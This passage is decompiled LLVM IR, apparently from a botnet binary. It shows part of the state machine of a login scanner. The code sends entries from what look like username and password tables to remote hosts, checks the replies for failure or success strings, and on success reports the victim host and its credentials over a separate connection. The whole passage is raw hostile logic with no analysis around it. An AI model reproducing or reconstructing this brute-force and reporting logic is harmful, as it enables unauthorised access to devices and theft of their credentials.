  store i32 %v2_16414, i32* %r3.global-to-local, align 4
  %v0_1641c = load i32, i32* @r4, align 4
  %v3_1641c = icmp ult i32 %v0_1641c, %v2_16414
  br i1 %v3_1641c, label %dec_label_pc_16424, label %dec_label_pc_16c1c

dec_label_pc_16424:                               ; preds = %dec_label_pc_163f0
  store i32 %v3_15c18, i32* %r2.global-to-local, align 4
  store i32 %v2_15cf4, i32* %r3.global-to-local, align 4
  %v1_16438 = call i32 @reset_ipstate(i32 %v2_15cf4)
  br label %dec_label_pc_16c1c

dec_label_pc_16440:                               ; preds = %dec_label_pc_15d34
  store i32 %storemerge549, i32* %r2.global-to-local, align 4
  store i32 %v3_15c18, i32* %r3.global-to-local, align 4
  %v4_16448 = mul i32 %storemerge549, 32
  %v5_16448 = add i32 %v4_16448, %v3_15c18
  %v6_16448 = inttoptr i32 %v5_16448 to i32*
  %v7_16448 = load i32, i32* %v6_16448, align 8
  store i32 %v7_16448, i32* @r4, align 4
  store i32 %v3_15c18, i32* %r2.global-to-local, align 4
  %v2_16460 = add i32 %v2_15cf4, 8
  store i32 %v2_16460, i32* %r3.global-to-local, align 4
  %v1_16464 = add i32 %v2_15cf4, 10
  %v2_16464 = inttoptr i32 %v1_16464 to i8*
  %v3_16464 = load i8, i8* %v2_16464, align 2
  %v4_16464 = zext i8 %v3_16464 to i32
  store i32 %v4_16464, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([328 x i8*]* @global_var_44d7c.663 to i32), i32* %r3.global-to-local, align 4
  %v4_16470 = mul nuw nsw i32 %v4_16464, 4
  %v5_16470 = add i32 %v4_16470, ptrtoint ([328 x i8*]* @global_var_44d7c.663 to i32)
  %v6_16470 = inttoptr i32 %v5_16470 to i32*
  %v7_16470 = load i32, i32* %v6_16470, align 4
  store i32 %v7_16470, i32* @r5, align 4
  store i32 %v3_15c18, i32* %r2.global-to-local, align 4
  store i32 %v2_16460, i32* %r3.global-to-local, align 4
  %v3_1648c = load i8, i8* %v2_16464, align 2
  %v4_1648c = zext i8 %v3_1648c to i32
  store i32 %v4_1648c, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([328 x i8*]* @global_var_44d7c.663 to i32), i32* %r3.global-to-local, align 4
  %v4_16498 = mul nuw nsw i32 %v4_1648c, 4
  %v5_16498 = add i32 %v4_16498, ptrtoint ([328 x i8*]* @global_var_44d7c.663 to i32)
  %v6_16498 = inttoptr i32 %v5_16498 to i32*
  %v7_16498 = load i32, i32* %v6_16498, align 4
  store i32 %v7_16498, i32* %r3.global-to-local, align 4
  %v1_1649c = inttoptr i32 %v7_16498 to i8*
  %v3_164a0 = call i32 @strlen(i8* %v1_1649c)
  %v0_164a8 = load i32, i32* @r4, align 4
  %v0_164ac = load i32, i32* @r5, align 4
  store i32 %v3_164a0, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_164b8 = call i32 @send(i32 %v0_164a8, i32 %v0_164ac, i32 %v3_164a0, i32 16384)
  store i32 %v4_164b8, i32* %r3.global-to-local, align 4
  %v1_164c0 = icmp slt i32 %v4_164b8, 0
  br i1 %v1_164c0, label %dec_label_pc_164c8, label %dec_label_pc_164e4

dec_label_pc_164c8:                               ; preds = %dec_label_pc_16440
  store i32 %v3_15c18, i32* %r2.global-to-local, align 4
  store i32 %v2_15cf4, i32* %r3.global-to-local, align 4
  %v1_164dc = call i32 @reset_ipstate(i32 %v2_15cf4)
  br label %dec_label_pc_16c1c

dec_label_pc_164e4:                               ; preds = %dec_label_pc_16440
  store i32 %storemerge549, i32* %r2.global-to-local, align 4
  store i32 %v3_15c18, i32* %r3.global-to-local, align 4
  %v7_164ec = load i32, i32* %v6_16448, align 8
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v5_16500 = call i32 @send(i32 %v7_164ec, i32 ptrtoint ([3 x i8]* @global_var_385ec.665 to i32), i32 2, i32 16384)
  %v1_16508 = icmp slt i32 %v5_16500, 0
  store i32 %v3_15c18, i32* %r2.global-to-local, align 4
  store i32 %v2_15cf4, i32* %r3.global-to-local, align 4
  br i1 %v1_16508, label %dec_label_pc_16510, label %dec_label_pc_1652c

dec_label_pc_16510:                               ; preds = %dec_label_pc_164e4
  %v1_16524 = call i32 @reset_ipstate(i32 %v2_15cf4)
  br label %dec_label_pc_16c1c

dec_label_pc_1652c:                               ; preds = %dec_label_pc_164e4
  %v2_16544 = inttoptr i32 %v2_15cf4 to i32*
  %v3_16544 = call i32 @advance_state(i32* %v2_16544, i32 4)
  br label %dec_label_pc_16c1c

dec_label_pc_1654c:                               ; preds = %dec_label_pc_15d34
  store i32 %storemerge549, i32* %r2.global-to-local, align 4
  store i32 %v3_15c18, i32* %r3.global-to-local, align 4
  %v4_16554 = mul i32 %storemerge549, 32
  %v5_16554 = add i32 %v4_16554, %v3_15c18
  %v6_16554 = inttoptr i32 %v5_16554 to i32*
  %v7_16554 = load i32, i32* %v6_16554, align 8
  store i32 %v3_15c18, i32* %r2.global-to-local, align 4
  %v2_1656c = add i32 %v3_15cf0, %v2_16328
  store i32 %v2_1656c, i32* %r3.global-to-local, align 4
  %v1_16570 = inttoptr i32 %v2_1656c to i32*
  %v2_16570 = load i32, i32* %v1_16570, align 4
  store i32 %v2_16570, i32* %r2.global-to-local, align 4
  %v1_16578 = load i32, i32* @sp, align 4
  %v2_16578 = inttoptr i32 %v1_16578 to i32*
  store i32 ptrtoint (i32* @global_var_452a0 to i32), i32* %v2_16578, align 4
  store i32 1024, i32* %r3.global-to-local, align 4
  %v4_16584 = inttoptr i32 %v2_16570 to i8*
  %v5_16584 = call i32 @read_until_response(i32 %v7_16554, i32 %arg1, i8* %v4_16584, i32 1024)
  store i32 %v5_16584, i32* %r3.global-to-local, align 4
  %v2_1658c = icmp eq i32 %v5_16584, 0
  br i1 %v2_1658c, label %dec_label_pc_16630, label %dec_label_pc_16594

dec_label_pc_16594:                               ; preds = %dec_label_pc_1654c
  store i32 %storemerge549, i32* @r4, align 4
  %v2_1659c = call i32 @__GI_time(i32* null)
  %v0_165b0 = load i32, i32* @r4, align 4
  %v3_165b0 = mul i32 %v0_165b0, 32
  %v2_165b8 = add i32 %v2_162cc, %v3_165b0
  %v2_165bc = inttoptr i32 %v2_165b8 to i32*
  store i32 %v2_1659c, i32* %v2_165bc, align 8
  store i32 %v3_15c18, i32* %r2.global-to-local, align 4
  store i32 %v2_1656c, i32* %r3.global-to-local, align 4
  %v2_165d8 = load i32, i32* %v1_16570, align 4
  store i32 %v2_165d8, i32* %r3.global-to-local, align 4
  %v1_165e0 = call i32 @contains_fail(i32 %v2_165d8)
  %v2_165e8 = icmp eq i32 %v1_165e0, 0
  store i32 %v3_15c18, i32* %r2.global-to-local, align 4
  store i32 %v2_15cf4, i32* %r3.global-to-local, align 4
  br i1 %v2_165e8, label %dec_label_pc_16610, label %dec_label_pc_165f0

dec_label_pc_165f0:                               ; preds = %dec_label_pc_16594
  %v2_16608 = inttoptr i32 %v2_15cf4 to i32*
  %v3_16608 = call i32 @advance_state(i32* %v2_16608, i32 0)
  br label %dec_label_pc_16c1c

dec_label_pc_16610:                               ; preds = %dec_label_pc_16594
  %v2_16628 = inttoptr i32 %v2_15cf4 to i32*
  %v3_16628 = call i32 @advance_state(i32* %v2_16628, i32 5)
  br label %dec_label_pc_16c1c

dec_label_pc_16630:                               ; preds = %dec_label_pc_1654c
  store i32 %v3_15c18, i32* %r2.global-to-local, align 4
  %v2_16644 = add i32 %v3_15cf0, %v2_162cc
  store i32 %v2_16644, i32* %r3.global-to-local, align 4
  %v1_16648 = inttoptr i32 %v2_16644 to i32*
  %v2_16648 = load i32, i32* %v1_16648, align 8
  store i32 %v2_16648, i32* %r3.global-to-local, align 4
  %v1_1664c = add i32 %v2_16648, 7
  store i32 %v1_1664c, i32* @r4, align 4
  %v2_16654 = call i32 @__GI_time(i32* null)
  store i32 %v2_16654, i32* %r3.global-to-local, align 4
  %v0_1665c = load i32, i32* @r4, align 4
  %v3_1665c = icmp ult i32 %v0_1665c, %v2_16654
  br i1 %v3_1665c, label %dec_label_pc_16664, label %dec_label_pc_16c1c

dec_label_pc_16664:                               ; preds = %dec_label_pc_16630
  store i32 %v3_15c18, i32* %r2.global-to-local, align 4
  store i32 %v2_15cf4, i32* %r3.global-to-local, align 4
  %v1_16678 = call i32 @reset_ipstate(i32 %v2_15cf4)
  br label %dec_label_pc_16c1c

dec_label_pc_16680:                               ; preds = %dec_label_pc_15d34
  store i32 %storemerge549, i32* %r2.global-to-local, align 4
  store i32 %v3_15c18, i32* %r3.global-to-local, align 4
  %v4_16688 = mul i32 %storemerge549, 32
  %v5_16688 = add i32 %v4_16688, %v3_15c18
  %v6_16688 = inttoptr i32 %v5_16688 to i32*
  %v7_16688 = load i32, i32* %v6_16688, align 8
  store i32 %v7_16688, i32* @r4, align 4
  store i32 %v3_15c18, i32* %r2.global-to-local, align 4
  %v2_166a0 = add i32 %v2_15cf4, 8
  store i32 %v2_166a0, i32* %r3.global-to-local, align 4
  %v1_166a4 = add i32 %v2_15cf4, 11
  %v2_166a4 = inttoptr i32 %v1_166a4 to i8*
  %v3_166a4 = load i8, i8* %v2_166a4, align 1
  %v4_166a4 = zext i8 %v3_166a4 to i32
  store i32 %v4_166a4, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([228 x i8*]* @global_var_44f0c.667 to i32), i32* %r3.global-to-local, align 4
  %v4_166b0 = mul nuw nsw i32 %v4_166a4, 4
  %v5_166b0 = add i32 %v4_166b0, ptrtoint ([228 x i8*]* @global_var_44f0c.667 to i32)
  %v6_166b0 = inttoptr i32 %v5_166b0 to i32*
  %v7_166b0 = load i32, i32* %v6_166b0, align 4
  store i32 %v7_166b0, i32* @r5, align 4
  store i32 %v3_15c18, i32* %r2.global-to-local, align 4
  store i32 %v2_166a0, i32* %r3.global-to-local, align 4
  %v3_166cc = load i8, i8* %v2_166a4, align 1
  %v4_166cc = zext i8 %v3_166cc to i32
  store i32 %v4_166cc, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([228 x i8*]* @global_var_44f0c.667 to i32), i32* %r3.global-to-local, align 4
  %v4_166d8 = mul nuw nsw i32 %v4_166cc, 4
  %v5_166d8 = add i32 %v4_166d8, ptrtoint ([228 x i8*]* @global_var_44f0c.667 to i32)
  %v6_166d8 = inttoptr i32 %v5_166d8 to i32*
  %v7_166d8 = load i32, i32* %v6_166d8, align 4
  store i32 %v7_166d8, i32* %r3.global-to-local, align 4
  %v1_166dc = inttoptr i32 %v7_166d8 to i8*
  %v3_166e0 = call i32 @strlen(i8* %v1_166dc)
  %v0_166e8 = load i32, i32* @r4, align 4
  %v0_166ec = load i32, i32* @r5, align 4
  store i32 %v3_166e0, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_166f8 = call i32 @send(i32 %v0_166e8, i32 %v0_166ec, i32 %v3_166e0, i32 16384)
  store i32 %v4_166f8, i32* %r3.global-to-local, align 4
  %v1_16700 = icmp slt i32 %v4_166f8, 0
  br i1 %v1_16700, label %dec_label_pc_16708, label %dec_label_pc_16724

dec_label_pc_16708:                               ; preds = %dec_label_pc_16680
  store i32 %v3_15c18, i32* %r2.global-to-local, align 4
  store i32 %v2_15cf4, i32* %r3.global-to-local, align 4
  %v1_1671c = call i32 @reset_ipstate(i32 %v2_15cf4)
  br label %dec_label_pc_16c1c

dec_label_pc_16724:                               ; preds = %dec_label_pc_16680
  store i32 %storemerge549, i32* %r2.global-to-local, align 4
  store i32 %v3_15c18, i32* %r3.global-to-local, align 4
  %v7_1672c = load i32, i32* %v6_16688, align 8
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v5_16740 = call i32 @send(i32 %v7_1672c, i32 ptrtoint ([3 x i8]* @global_var_385ec.665 to i32), i32 2, i32 16384)
  %v1_16748 = icmp slt i32 %v5_16740, 0
  store i32 %v3_15c18, i32* %r2.global-to-local, align 4
  store i32 %v2_15cf4, i32* %r3.global-to-local, align 4
  br i1 %v1_16748, label %dec_label_pc_16750, label %dec_label_pc_1676c

dec_label_pc_16750:                               ; preds = %dec_label_pc_16724
  %v1_16764 = call i32 @reset_ipstate(i32 %v2_15cf4)
  br label %dec_label_pc_16c1c

dec_label_pc_1676c:                               ; preds = %dec_label_pc_16724
  %v2_16784 = inttoptr i32 %v2_15cf4 to i32*
  %v3_16784 = call i32 @advance_state(i32* %v2_16784, i32 6)
  br label %dec_label_pc_16c1c

dec_label_pc_1678c:                               ; preds = %dec_label_pc_15d34
  store i32 %storemerge549, i32* %r2.global-to-local, align 4
  store i32 %v3_15c18, i32* %r3.global-to-local, align 4
  %v4_16794 = mul i32 %storemerge549, 32
  %v5_16794 = add i32 %v4_16794, %v3_15c18
  %v6_16794 = inttoptr i32 %v5_16794 to i32*
  %v7_16794 = load i32, i32* %v6_16794, align 8
  store i32 %v3_15c18, i32* %r2.global-to-local, align 4
  %v2_167ac = add i32 %v3_15cf0, %v2_16328
  store i32 %v2_167ac, i32* %r3.global-to-local, align 4
  %v1_167b0 = inttoptr i32 %v2_167ac to i32*
  %v2_167b0 = load i32, i32* %v1_167b0, align 4
  store i32 %v2_167b0, i32* %r2.global-to-local, align 4
  %v1_167b8 = load i32, i32* @sp, align 4
  %v2_167b8 = inttoptr i32 %v1_167b8 to i32*
  store i32 ptrtoint ([10 x i8*]* @global_var_45328.669 to i32), i32* %v2_167b8, align 4
  store i32 1024, i32* %r3.global-to-local, align 4
  %v4_167c4 = inttoptr i32 %v2_167b0 to i8*
  %v5_167c4 = call i32 @read_until_response(i32 %v7_16794, i32 %arg1, i8* %v4_167c4, i32 1024)
  store i32 %v5_167c4, i32* %r3.global-to-local, align 4
  %v2_167cc = icmp eq i32 %v5_167c4, 0
  br i1 %v2_167cc, label %dec_label_pc_16990, label %dec_label_pc_167d4

dec_label_pc_167d4:                               ; preds = %dec_label_pc_1678c
  store i32 %storemerge549, i32* @r4, align 4
  %v2_167dc = call i32 @__GI_time(i32* null)
  %v0_167f0 = load i32, i32* @r4, align 4
  %v3_167f0 = mul i32 %v0_167f0, 32
  %v2_167f8 = add i32 %v2_162cc, %v3_167f0
  %v2_167fc = inttoptr i32 %v2_167f8 to i32*
  store i32 %v2_167dc, i32* %v2_167fc, align 8
  store i32 %v3_15c18, i32* %r2.global-to-local, align 4
  store i32 %v2_167ac, i32* %r3.global-to-local, align 4
  %v2_16818 = load i32, i32* %v1_167b0, align 4
  store i32 %v2_16818, i32* %r3.global-to-local, align 4
  %v1_16820 = call i32 @contains_fail(i32 %v2_16818)
  store i32 %v1_16820, i32* %r3.global-to-local, align 4
  %v2_16828 = icmp eq i32 %v1_16820, 0
  store i32 %v3_15c18, i32* %r2.global-to-local, align 4
  br i1 %v2_16828, label %dec_label_pc_16850, label %dec_label_pc_16830

dec_label_pc_16830:                               ; preds = %dec_label_pc_167d4
  store i32 %v2_15cf4, i32* %r3.global-to-local, align 4
  %v2_16848 = inttoptr i32 %v2_15cf4 to i32*
  %v3_16848 = call i32 @advance_state(i32* %v2_16848, i32 0)
  br label %dec_label_pc_16c1c

dec_label_pc_16850:                               ; preds = %dec_label_pc_167d4
  store i32 %v2_167ac, i32* %r3.global-to-local, align 4
  %v2_16868 = load i32, i32* %v1_167b0, align 4
  store i32 %v2_16868, i32* %r3.global-to-local, align 4
  %v1_16870 = call i32 @contains_success(i32 %v2_16868)
  store i32 %v1_16870, i32* %r3.global-to-local, align 4
  %v2_16878 = icmp eq i32 %v1_16870, 0
  store i32 %v3_15c18, i32* %r2.global-to-local, align 4
  br i1 %v2_16878, label %dec_label_pc_16974, label %dec_label_pc_16880

dec_label_pc_16880:                               ; preds = %dec_label_pc_16850
  %v2_16894 = add i32 %v2_15cf4, 8
  store i32 %v2_16894, i32* %r3.global-to-local, align 4
  %v1_16898 = add i32 %v2_15cf4, 9
  %v2_16898 = inttoptr i32 %v1_16898 to i8*
  %v3_16898 = load i8, i8* %v2_16898, align 1
  %v4_16898 = zext i8 %v3_16898 to i32
  store i32 %v4_16898, i32* %r3.global-to-local, align 4
  %v7_1689c = icmp eq i8 %v3_16898, 2
  br i1 %v7_1689c, label %dec_label_pc_168a4, label %dec_label_pc_168c4

dec_label_pc_168a4:                               ; preds = %dec_label_pc_16880
  store i32 %v3_15c18, i32* %r2.global-to-local, align 4
  store i32 %v2_15cf4, i32* %r3.global-to-local, align 4
  %v2_168bc = inttoptr i32 %v2_15cf4 to i32*
  %v3_168bc = call i32 @advance_state(i32* %v2_168bc, i32 7)
  br label %dec_label_pc_16c1c

dec_label_pc_168c4:                               ; preds = %dec_label_pc_16880
  %v2_168c8 = load i32, i32* @global_var_53710.671, align 4
  store i32 %v2_168c8, i32* @r4, align 4
  store i32 %v3_15c18, i32* %r2.global-to-local, align 4
  store i32 %v2_15cf4, i32* %r3.global-to-local, align 4
  %v3_168e0 = call i32 @get_ipstate_host(i32 %v2_15cf4, i32 8, i32 %v3_15c18)
  store i32 %v3_168e0, i32* %ip.global-to-local, align 4
  store i32 %v3_15c18, i32* %r2.global-to-local, align 4
  store i32 %v2_16894, i32* %r3.global-to-local, align 4
  %v1_16900 = add i32 %v2_15cf4, 10
  %v2_16900 = inttoptr i32 %v1_16900 to i8*
  %v3_16900 = load i8, i8* %v2_16900, align 2
  %v4_16900 = zext i8 %v3_16900 to i32
  store i32 %v4_16900, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([328 x i8*]* @global_var_44d7c.663 to i32), i32* %r3.global-to-local, align 4
  %v4_1690c = mul nuw nsw i32 %v4_16900, 4
  %v5_1690c = add i32 %v4_1690c, ptrtoint ([328 x i8*]* @global_var_44d7c.663 to i32)
  %v6_1690c = inttoptr i32 %v5_1690c to i32*
  %v7_1690c = load i32, i32* %v6_1690c, align 4
  store i32 %v3_15c18, i32* %r2.global-to-local, align 4
  store i32 %v2_16894, i32* %r3.global-to-local, align 4
  %v1_16928 = add i32 %v2_15cf4, 11
  %v2_16928 = inttoptr i32 %v1_16928 to i8*
  %v3_16928 = load i8, i8* %v2_16928, align 1
  %v4_16928 = zext i8 %v3_16928 to i32
  store i32 %v4_16928, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([228 x i8*]* @global_var_44f0c.667 to i32), i32* %r3.global-to-local, align 4
  %v4_16934 = mul nuw nsw i32 %v4_16928, 4
  %v5_16934 = add i32 %v4_16934, ptrtoint ([228 x i8*]* @global_var_44f0c.667 to i32)
  %v6_16934 = inttoptr i32 %v5_16934 to i32*
  %v7_16934 = load i32, i32* %v6_16934, align 4
  store i32 %v7_16934, i32* %r3.global-to-local, align 4
  %v1_16938 = load i32, i32* @sp, align 4
  %v2_16938 = inttoptr i32 %v1_16938 to i32*
  store i32 %v7_1690c, i32* %v2_16938, align 4
  %v0_1693c = load i32, i32* %r3.global-to-local, align 4
  %v1_1693c = load i32, i32* @sp, align 4
  %v2_1693c = add i32 %v1_1693c, 4
  %v3_1693c = inttoptr i32 %v2_1693c to i32*
  store i32 %v0_1693c, i32* %v3_1693c, align 4
  %v0_16948 = load i32, i32* @r4, align 4
  store i32 %v0_16948, i32* @r2, align 4
  %v0_1694c = load i32, i32* %ip.global-to-local, align 4
  store i32 %v0_1694c, i32* %r3.global-to-local, align 4
  %v3_16950 = call i32 @Send(i32 %arg3, i32 ptrtoint ([52 x i8]* @global_var_385f0.673 to i32))
  store i32 %v3_15c18, i32* %r2.global-to-local, align 4
  store i32 %v2_15cf4, i32* %r3.global-to-local, align 4
  %v2_1696c = inttoptr i32 %v2_15cf4 to i32*
  %v3_1696c = call i32 @advance_state(i32* %v2_1696c, i32 7)
  br label %dec_label_pc_16c1c

dec_label_pc_16974:                               ; preds = %dec_label_pc_16850
  store i32 %v2_15cf4, i32* %r3.global-to-local, align 4
  %v1_16988 = call i32 @reset_ipstate(i32 %v2_15cf4)
  br label %dec_label_pc_16c1c

dec_label_pc_16990:                               ; preds = %dec_label_pc_1678c
  store i32 %v3_15c18, i32* %r2.global-to-local, align 4
  %v2_169a4 = add i32 %v3_15cf0, %v2_162cc
  store i32 %v2_169a4, i32* %r3.global-to-local, align 4
  %v1_169a8 = inttoptr i32 %v2_169a4 to i32*
  %v2_169a8 = load i32, i32* %v1_169a8, align 8
  store i32 %v2_169a8, i32* %r3.global-to-local, align 4
  %v1_169ac = add i32 %v2_169a8, 7
  store i32 %v1_169ac, i32* @r4, align 4
  %v2_169b4 = call i32 @__GI_time(i32* null)
  store i32 %v2_169b4, i32* %r3.global-to-local, align 4
  %v0_169bc = load i32, i32* @r4, align 4
  %v3_169bc = icmp ult i32 %v0_169bc, %v2_169b4
  br i1 %v3_169bc, label %dec_label_pc_169c4, label %dec_label_pc_16c1c

dec_label_pc_169c4:                               ; preds = %dec_label_pc_16990
  store i32 %v3_15c18, i32* %r2.global-to-local, align 4
  store i32 %v2_15cf4, i32* %r3.global-to-local, align 4
  %v1_169d8 = call i32 @reset_ipstate(i32 %v2_15cf4)
  br label %dec_label_pc_16c1c

dec_label_pc_169e0:                               ; preds = %dec_label_pc_15d34
  store i32 %storemerge549, i32* @r4, align 4
  %v2_169e8 = call i32 @__GI_time(i32* null)
  %v0_169fc = load i32, i32* @r4, align 4
  %v3_169fc = mul i32 %v0_169fc, 32
  %v2_16a04 = add i32 %v2_162cc, %v3_169fc
  %v2_16a08 = inttoptr i32 %v2_16a04 to i32*
  store i32 %v2_169e8, i32* %v2_16a08, align 8
  store i32 %storemerge549, i32* %r2.global-to-local, align 4
  store i32 %v3_15c18, i32* %r3.global-to-local, align 4
  %v4_16a14 = mul i32 %storemerge549, 32
  %v5_16a14 = add i32 %v4_16a14, %v3_15c18
  %v6_16a14 = inttoptr i32 %v5_16a14 to i32*
  %v7_16a14 = load i32, i32* %v6_16a14, align 8
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v5_16a28 = call i32 @send(i32 %v7_16a14, i32 ptrtoint ([5 x i8]* @global_var_38624.675 to i32), i32 4, i32 16384)
  store i32 %storemerge549, i32* %r2.global-to-local, align 4
  store i32 %v3_15c18, i32* %r3.global-to-local, align 4
  %v7_16a34 = load i32, i32* %v6_16a14, align 8
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v5_16a48 = call i32 @send(i32 %v7_16a34, i32 ptrtoint ([8 x i8]* @global_var_3862c.677 to i32), i32 7, i32 16384)
  store i32 %storemerge549, i32* %r2.global-to-local, align 4
  store i32 %v3_15c18, i32* %r3.global-to-local, align 4
  %v7_16a54 = load i32, i32* %v6_16a14, align 8
  store i32 %v7_16a54, i32* @r4, align 4
  %v2_16a5c = load i32, i32* bitcast ([116 x i8*]* @global_var_44ae8.794 to i32*), align 16
  store i32 %v2_16a5c, i32* @r5, align 4
  store i32 %v2_16a5c, i32* %r3.global-to-local, align 4
  %v1_16a68 = inttoptr i32 %v2_16a5c to i8*
  %v3_16a6c = call i32 @strlen(i8* %v1_16a68)
  %v0_16a74 = load i32, i32* @r4, align 4
  %v0_16a78 = load i32, i32* @r5, align 4
  store i32 %v3_16a6c, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_16a84 = call i32 @send(i32 %v0_16a74, i32 %v0_16a78, i32 %v3_16a6c, i32 16384)
  store i32 %v4_16a84, i32* %r3.global-to-local, align 4
  %v1_16a8c = icmp slt i32 %v4_16a84, 0
  br i1 %v1_16a8c, label %dec_label_pc_16a94, label %dec_label_pc_16b40

dec_label_pc_16a94:                               ; preds = %dec_label_pc_169e0
  %v2_16a98 = load i32, i32* @global_var_53710.671, align 4
  store i32 %v2_16a98, i32* @r4, align 4
  store i32 %v3_15c18, i32* %r2.global-to-local, align 4
  store i32 %v2_15cf4, i32* %r3.global-to-local, align 4
  %v3_16ab0 = call i32 @get_ipstate_host(i32 %v2_15cf4, i32 %v0_16a78, i32 %v3_15c18)
  store i32 %v3_16ab0, i32* %ip.global-to-local, align 4
  store i32 %v3_15c18, i32* %r2.global-to-local, align 4
  %v2_16acc = add i32 %v2_15cf4, 8
  store i32 %v2_16acc, i32* %r3.global-to-local, align 4
  %v1_16ad0 = add i32 %v2_15cf4, 10
  %v2_16ad0 = inttoptr i32 %v1_16ad0 to i8*
  %v3_16ad0 = load i8, i8* %v2_16ad0, align 2
  %v4_16ad0 = zext i8 %v3_16ad0 to i32
  store i32 %v4_16ad0, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([328 x i8*]* @global_var_44d7c.663 to i32), i32* %r3.global-to-local, align 4
  %v4_16adc = mul nuw nsw i32 %v4_16ad0, 4
  %v5_16adc = add i32 %v4_16adc, ptrtoint ([328 x i8*]* @global_var_44d7c.663 to i32)
  %v6_16adc = inttoptr i32 %v5_16adc to i32*
  %v7_16adc = load i32, i32* %v6_16adc, align 4
  store i32 %v3_15c18, i32* %r2.global-to-local, align 4
  store i32 %v2_16acc, i32* %r3.global-to-local, align 4
  %v1_16af8 = add i32 %v2_15cf4, 11
  %v2_16af8 = inttoptr i32 %v1_16af8 to i8*
  %v3_16af8 = load i8, i8* %v2_16af8, align 1
  %v4_16af8 = zext i8 %v3_16af8 to i32
  store i32 %v4_16af8, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([228 x i8*]* @global_var_44f0c.667 to i32), i32* %r3.global-to-local, align 4
  %v4_16b04 = mul nuw nsw i32 %v4_16af8, 4
  %v5_16b04 = add i32 %v4_16b04, ptrtoint ([228 x i8*]* @global_var_44f0c.667 to i32)
  %v6_16b04 = inttoptr i32 %v5_16b04 to i32*
  %v7_16b04 = load i32, i32* %v6_16b04, align 4
  store i32 %v7_16b04, i32* %r3.global-to-local, align 4
  %v1_16b08 = load i32, i32* @sp, align 4
  %v2_16b08 = inttoptr i32 %v1_16b08 to i32*
  store i32 %v7_16adc, i32* %v2_16b08, align 4
  %v0_16b0c = load i32, i32* %r3.global-to-local, align 4
  %v1_16b0c = load i32, i32* @sp, align 4
  %v2_16b0c = add i32 %v1_16b0c, 4
  %v3_16b0c = inttoptr i32 %v2_16b0c to i32*
  store i32 %v0_16b0c, i32* %v3_16b0c, align 4
  %v0_16b18 = load i32, i32* @r4, align 4
  store i32 %v0_16b18, i32* @r2, align 4
  %v0_16b1c = load i32, i32* %ip.global-to-local, align 4
  store i32 %v0_16b1c, i32* %r3.global-to-local, align 4
  %v3_16b20 = call i32 @Send(i32 %arg3, i32 ptrtoint ([53 x i8]* @global_var_38634.796 to i32))
  store i32 %v3_15c18, i32* %r2.global-to-local, align 4
  store i32 %v2_15cf4, i32* %r3.global-to-local, align 4
  %v1_16b38 = call i32 @reset_ipstate(i32 %v2_15cf4)
  br label %dec_label_pc_16c1c

dec_label_pc_16b40:                               ; preds = %dec_label_pc_169e0
  store i32 %v3_15c18, i32* %r2.global-to-local, align 4
  %v2_16b54 = add i32 %v3_15cf0, %v2_162cc
  store i32 %v2_16b54, i32* %r3.global-to-local, align 4
  %v1_16b58 = inttoptr i32 %v2_16b54 to i32*
  %v2_16b58 = load i32, i32* %v1_16b58, align 8
  store i32 %v2_16b58, i32* %r3.global-to-local, align 4
  %v1_16b5c = add i32 %v2_16b58, 10
  store i32 %v1_16b5c, i32* @r4, align 4
  %v2_16b64 = call i32 @__GI_time(i32* null)
  store i32 %v2_16b64, i32* %r3.global-to-local, align 4
  %v0_16b6c = load i32, i32* @r4, align 4
  %v3_16b6c = icmp ult i32 %v0_16b6c, %v2_16b64
  br i1 %v3_16b6c, label %dec_label_pc_16b74, label %dec_label_pc_16c1c

dec_label_pc_16b74:                               ; preds = %dec_label_pc_16b40
  %v2_16b78 = load i32, i32* @global_var_53710.671, align 4
  store i32 %v2_16b78, i32* @r4, align 4
  store i32 %v3_15c18, i32* %r2.global-to-local, align 4
  store i32 %v2_15cf4, i32* %r3.global-to-local, align 4
  %v3_16b90 = call i32 @get_ipstate_host(i32 %v2_15cf4, i32 16, i32 %v3_15c18)
  store i32 %v3_16b90, i32* %ip.global-to-local, align 4
  store i32 %v3_15c18, i32* %r2.global-to-local, align 4
  %v2_16bac = add i32 %v2_15cf4, 8
  store i32 %v2_16bac, i32* %r3.global-to-local, align 4
  %v1_16bb0 = add i32 %v2_15cf4, 10
  %v2_16bb0 = inttoptr i32 %v1_16bb0 to i8*
  %v3_16bb0 = load i8, i8* %v2_16bb0, align 2
  %v4_16bb0 = zext i8 %v3_16bb0 to i32
  store i32 %v4_16bb0, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([328 x i8*]* @global_var_44d7c.663 to i32), i32* %r3.global-to-local, align 4
  %v4_16bbc = mul nuw nsw i32 %v4_16bb0, 4
  %v5_16bbc = add i32 %v4_16bbc, ptrtoint ([328 x i8*]* @global_var_44d7c.663 to i32)
  %v6_16bbc = inttoptr i32 %v5_16bbc to i32*
  %v7_16bbc = load i32, i32* %v6_16bbc, align 4
  store i32 %v3_15c18, i32* %r2.global-to-local, align 4
  store i32 %v2_16bac, i32* %r3.global-to-local, align 4
  %v1_16bd8 = add i32 %v2_15cf4, 11
  %v2_16bd8 = inttoptr i32 %v1_16bd8 to i8*
  %v3_16bd8 = load i8, i8* %v2_16bd8, align 1
  %v4_16bd8 = zext i8 %v3_16bd8 to i32
  store i32 %v4_16bd8, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([228 x i8*]* @global_var_44f0c.667 to i32), i32* %r3.global-to-local, align 4
  %v4_16be4 = mul nuw nsw i32 %v4_16bd8, 4
  %v5_16be4 = add i32 %v4_16be4, ptrtoint ([228 x i8*]* @global_var_44f0c.667 to i32)
